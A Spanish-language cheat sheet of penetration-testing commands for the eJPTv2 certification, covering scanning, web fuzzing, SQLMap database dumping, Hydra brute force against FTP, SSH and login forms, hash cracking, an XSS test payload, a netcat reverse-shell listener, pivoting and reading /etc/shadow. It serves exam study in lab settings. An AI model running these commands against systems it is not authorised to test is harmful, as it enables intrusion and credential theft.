# Cheatsheet-EJPTv2
eJPT-Cheatsheet
Recursos que te pueden interesar:
eJPT - Review
Aprobar el eJPT a la primera
Barrido de Ping - Ping Sweep
Nmap
bash
Copiar código
nmap -sn 10.10.10.0/24
fping
bash
Copiar código
fping -a -g 10.10.10.0/24 2>/dev/null
Password Cracking
John the Ripper
bash
Copiar código
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Herramientas en Línea
CrackStation

Dump Hashes
Unshadow
bash
Copiar código
unshadow passwd shadow > hashes.txt
Fuzzing
Nmap
bash
Copiar código
nmap --script=http-enum -p80 10.10.14.16 -oN webScan
wfuzz
bash
Copiar código
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ.php
dirb
bash
Copiar código
dirb http://10.10.15.12
gobuster
bash
Copiar código
gobuster dir -u 10.10.14.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
SQLMap
bash
Copiar código
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id --dbs
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname --tables
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname -T table_name --dump
Hydra
bash
Copiar código
hydra -v -l admin -P passlist.txt ftp://192.168.0.1
hydra -v -L userlist.txt -P passlist.txt ftp://192.168.0.1
hydra -v -l root -P passwords.txt -t 1 -u 10.10.14.10 ssh
hydra http://10.10.14.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect"
XSS
html
Copiar código
<script>alert('xss')</script>
<h1>H1</h1>
SMB
Enumeración de SMB
bash
Copiar código
smbclient -L 10.10.14.12 -N
smbmap -H 10.10.14.12 -u 'null'
nmap --script=smb-vuln* -p445 10.10.14.15 -oN smbScan
smbmap -H 10.10.14.15 -R backups -u 'null'
Acceso al recurso compartido backups
bash
Copiar código
smbclient //10.10.14.15/backups
FTP
Enumeración de FTP
bash
Copiar código
nmap --script=ftp-anon -p21 10.10.14.12
ftp 10.10.14.12
cd ..
FTP - Fuerza Bruta
bash
Copiar código
hydra -l admin -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.1
Enumeración de Windows
bash
Copiar código
dir /b/s "\*.conf*"
dir /b/s "\*.txt*"
dir /b/s "\*secret*"
route print
netstat -r
fsutil fsinfo drives
wmic logicaldisk get Caption,Description,providername
Reverse Shell
Netcat
bash
Copiar código
nc -nlvp 443
Metasploit
bash
Copiar código
msfconsole
Post Explotación
Pivoting
IP Route
bash
Copiar código
ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0
Metasploit
bash
Copiar código
run autoroute -s 10.10.16.0/24
Wireshark
bash
Copiar código
ip.addr==192.168.12
ip.src == 192.168.2.11
ip.dst == 192.168.2.15
Comandos Básicos
Comando	Descripción
sudo openvpn user.ovpn	Conectarte por VPN
ifconfig/ip a	Ver las direcciones IP de nuestra máquina
netstat -rn	Visualizar las distintas conexiones vía VPN
ssh user@10.10.10.10	Conectarte por el servicio SSH
ftp 10.10.10.10 -p 22	Conectarte a un servidor FTP
Enumeración de OS (sistema operativo)
Comando	Dispositivo (OS)	TTL
ping -c 2 10.10.10.10	Linux/Unix	64
Windows	128
Solaris/AIX	254
Puertos y Servicios por Defecto
Puerto	Servicio
25	SMTP
22	SSH
110	POP3
143	IMAP
80	HTTP
443	HTTPS
137, 138, 139	NETBIOS
115	SFTP
23	Telnet
21	FTP
3389	RDP
3306	MySQL
1433	MS SQL Server
Enumeración de Hosts
Comando
fping
sudo fping -a -g 10.10.10.10/24 2>/dev/null
sudo fping -a -i 1 -r 0 < hosts.txt
nmap -sn 10.10.10.10/24
Escaneo de Puertos y Servicios
Comando
nmap -p- -sS --min-rate 5000 -Pn -n 10.10.10.10
nmap -iL target_hosts.txt
nmap -F -n -vvv 10.10.10.10
nmap -n -vvv 10.10.10.10
nmap -p21,22,80 -sCV 10.10.10.10 -oN servicesScan
nmap -p21,22,80 -sC -sV 10.10.10.10 -oN servicesScan
sudo masscan -p 21,22,80,8080,445,9200 --rate 64000 --wait 0 --open-only -oG masscan.gnmap 10.10.10.10/24
sudo masscan -iL hosts.list -p0-65535 --rate 64000 --open-only
Enumeración Web
Comando
whatweb http://10.10.10.10:80
gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/
gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/admin/ -U user -P password
dirb http://10.10.10.10/
dirb http://10.10.10.10/admin -u user:password
dirbuster vhost -r -u domain.com -w list_subdominios.txt
wfuzz -c -w /opt/wordlists/SecLists/Discovery/web-Content/IIS.fuzz.txt -u http://10.10.10.10/FUZZ
Protocolo de transferencia de archivos
Comando	Descripción
scp file.txt user@10.10.10.10:/home/user/	Transferir archivo a un servidor remoto
sftp user@10.10.10.10	Conectarse a un servidor SFTP
Reconocimiento de Redes
Comando	Descripción
arp-scan -l	Escanear la red local
nmap -sn 10.0.0.0/8	Escanear la subred local
nmap -sn 192.168.1.0/24	Escanear la subred local
Privilegios
Comando	Descripción
sudo -l	Ver los comandos que el usuario puede ejecutar como superusuario
sudo su	Cambiar a root
Escalado de Privilegios
Comando	Descripción
whoami	Mostrar el usuario actual
id	Mostrar el UID y GID del usuario actual
uname -a	Mostrar la información del kernel
cat /etc/passwd	Listar todos los usuarios
cat /etc/shadow	Listar las contraseñas de los usuarios
cat /etc/group	Listar los grupos de usuarios
Herramientas Útiles
Wireshark: Herramienta de análisis de tráfico de red.
Burp Suite: Herramienta para pruebas de penetración web.
Metasploit Framework: Herramienta para la explotación de vulnerabilidades.
